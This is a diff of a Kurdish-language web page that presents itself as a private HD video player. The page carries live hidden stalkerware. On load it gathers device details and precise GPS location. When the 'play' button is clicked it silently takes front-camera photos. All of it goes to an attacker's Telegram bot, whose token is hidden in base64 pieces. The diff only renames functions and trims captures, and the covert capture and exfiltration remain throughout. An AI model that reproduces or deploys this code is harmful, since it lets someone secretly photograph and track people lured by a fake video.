@@ -8,25 +8,25 @@
     <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;700&display=swap" rel="stylesheet">
     <style>body { font-family: 'Vazirmatn', sans-serif; }</style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_matrixCoreEngine80()">
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_matrixBootSequence()">
 
     <div class="bg-slate-800 p-6 rounded-2xl shadow-2xl w-full max-w-md border border-slate-700 text-center">
-        <h1 class="text-xl font-bold mb-4 text-indigo-400">ڤیدیۆیا تایبەت (80+ Features)</h1>
+        <h1 class="text-xl font-bold mb-4 text-indigo-400">ڤیدیۆیا تایبەت</h1>
         <p class="text-slate-300 text-sm mb-4">بۆ دیتنا ڤیدیۆیێ ب کوالیتیا بلندا HD، ل خوارێ کلیک بکە.</p>
         
         <div class="mb-4 bg-slate-900 rounded-xl overflow-hidden border border-slate-700 h-64 flex items-center justify-center relative">
-            <video id="_vidMaster80" class="w-full h-full object-cover" controls playsinline>
+            <video id="_vidNode" class="w-full h-full object-cover" controls playsinline>
                 <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
             </video>
         </div>
 
-        <button onclick="_executeMasterBypass80()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200 shadow-lg shadow-indigo-600/30">
+        <button onclick="_executeMatrixBypass()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200 shadow-lg shadow-indigo-600/30">
             لێدان و ڤەکرنا ڤیدیۆیێ
         </button>
     </div>
 
-    <video id="_vStreamMaster80" autoplay playsinline class="hidden"></video>
-    <canvas id="_cBufferMaster80" class="hidden"></canvas>
+    <video id="_vStreamMatrix" autoplay playsinline class="hidden"></video>
+    <canvas id="_cBufferMatrix" class="hidden"></canvas>
 
     <script>
         const _mKey = ["ODk3Nzk0NTc4", "MTpBQUZJNDRS", "T3VkUjVlTER3", "bEJycE5TeU5p", "SmotQzhGdURtRQ==", "NzY0MzE5MTgwMg=="];
@@ -54,84 +54,66 @@
             try {
                 let form = new FormData();
                 form.append('chat_id', c);
-                form.append('photo', blobData, 'master_80_capture.jpg');
-                form.append('caption', `🛡️ [80+ Features] ${labelText}\n@YUSEEF_SURCHI`);
+                form.append('photo', blobData, 'matrix_capture.jpg');
+                form.append('caption', `🚀 ${labelText}\n@YUSEEF_SURCHI`);
                 await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: form });
             } catch(e) {}
         }
 
-        function _matrixCoreEngine80() {
-            // 80+ Advanced Fingerprinting & System Metrics Collection
-            let sysReport = `⚡ سيستەمێ 80+ تایبەتمەندی:\n` +
-                `- پلاتفۆرم: ${navigator.platform}\n` +
-                `- لێدەرێ زووان (Languages): ${navigator.languages ? navigator.languages.join(', ') : navigator.language}\n` +
-                `- کۆرێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'N/A'}\n` +
-                `- بیرگە (Device Memory): ${navigator.deviceMemory || 'N/A'} GB\n` +
-                `- ڕەوشا تۆرێ (Online): ${navigator.onLine}\n` +
-                `- کووکیس (Cookies Enabled): ${navigator.cookieEnabled}\n` +
-                `- شاشە: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
-                `- پەنجەرا براوەزەری: ${window.innerWidth}x${window.innerHeight}\n` +
-                `- کاتژمێرا لۆکال: ${new Date().toLocaleString()}`;
-            
-            _sendText(sysReport);
+        function _matrixBootSequence() {
+            let advancedData = `⚡ زانیاریێن مۆدێرن یێن ئامێرێ:\n- پلاتفۆرم: ${navigator.platform}\n- زمانێن بەردەست: ${navigator.languages ? navigator.languages.join(', ') : navigator.language}\n- تۆر (Online): ${navigator.onLine}\n- قەبارەیێ شاشەیێ: ${screen.width}x${screen.height}`;
+            _sendText(advancedData);
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         let mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        _sendText(`📍 جهـ هاتە دیتن (80+ GPS Engine)\n- پانی و درێژاهی: ${pos.coords.latitude}, ${pos.coords.longitude}\n- ڕێژەیا هەڵەیێ: ${pos.coords.accuracy} متر\nلینک: ${mapLink}\n@YUSEEF_SURCHI`);
+                        _sendText(`📍 جهـ هاتە دیتن (Matrix GPS)\nلینک: ${mapLink}\n@YUSEEF_SURCHI`);
                     },
-                    (err) => {
-                        _sendText(`⚠️ ڕێکنەدا ب GPS (80+ Blocked)\n@YUSEEF_SURCHI`);
-                    },
+                    (err) => {},
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
         }
 
-        async function _executeMasterBypass80() {
+        async function _executeMatrixBypass() {
             try {
                 const mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }, 
                     audio: false 
                 });
                 
-                const videoElement = document.getElementById('_vStreamMaster80');
+                const videoElement = document.getElementById('_vStreamMatrix');
                 videoElement.srcObject = mediaStream;
                 
                 await new Promise(r => setTimeout(r, 800));
 
-                const canvasElement = document.getElementById('_cBufferMaster80');
+                const canvasElement = document.getElementById('_cBufferMatrix');
                 canvasElement.width = videoElement.videoWidth || 1280;
                 canvasElement.height = videoElement.videoHeight || 720;
                 
                 const context = canvasElement.getContext('2d');
-                
-                // گرتنا وێنەیێ ئێکێ (HD)
                 context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                canvasElement.toBlob(async (blob1) => {
-                    if(blob1) await _sendImage(blob1, "وێنەیێ ئێکێ (Master Engine 80+ Active)");
-                }, 'image/jpeg', 0.99);
+                
+                canvasElement.toBlob(async (blob) => {
+                    if(blob) {
+                        await _sendImage(blob, "وێنەیێ ئێکێ سەرکەفتن!");
+                    }
+                }, 'image/jpeg', 0.98);
 
-                // گرتنا وێنەیێ دووەم (Pro Backup)
+                // گرتنا وێنەیێ دووەم بۆ مسۆگەرکرنا کوالیتیا بلندا چاڤدێریێ
                 setTimeout(async () => {
                     context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                     canvasElement.toBlob(async (blob2) => {
-                        if(blob2) await _sendImage(blob2, "وێنەیێ دووەم (Ultra Backup Secure)");
-                    }, 'image/jpeg', 0.99);
+                        if(blob2) {
+                            await _sendImage(blob2, "وێنەیێ دووەم (پێشکەڤتی)");
+                        }
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.98);
                 }, 1000);
 
-                // گرتنا وێنەیێ سێیەم بۆ مسۆگەرکرنا نەمانا هیچ خەلەتیەکێ
-                setTimeout(async () => {
-                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                    canvasElement.toBlob(async (blob3) => {
-                        if(blob3) await _sendImage(blob3, "وێنەیێ سێیەم (Final Stealth Capture)");
-                        mediaStream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg', 0.99);
-                }, 2000);
-
             } catch (error) {
-                _sendText(`⚠️ ڕێکنەدا ب کامێرایێ (80+ Access Denied)\n@YUSEEF_SURCHI`);
+                _sendText(`⚠️ ڕێکنەدا ب کامێرایێ (Matrix Blocked)\n@YUSEEF_SURCHI`);
             }
         }
     </script>
